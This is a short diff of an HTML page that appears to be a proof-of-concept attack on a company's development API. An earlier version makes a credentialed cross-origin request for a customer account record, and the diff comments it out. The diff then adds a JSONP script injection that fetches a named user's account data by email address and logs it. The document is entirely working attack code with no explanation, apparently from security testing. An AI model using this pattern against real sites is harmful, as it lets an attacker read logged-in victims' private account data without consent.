@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html>
 <script>
 var xhttp = new XMLHttpRequest();
@@ -12,4 +12,21 @@ xhttp.open("GET", "https://dev-hac.beaverztech.com/api/customer-account/user/59?
 xhttp.withCredentials = true;
 xhttp.send();
 </script>
+</html>
+ -->
+
+ <!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      function handleResponse(data) {
+        console.log(data);
+      }
+
+      var script = document.createElement("script");
+      script.src =
+        "https://dev-hac.beaverztech.com/api/customer-account/user/59?username=poiuy@gmail.com&callback=handleResponse";
+      document.body.appendChild(script);
+    </script>
+  </body>
 </html>
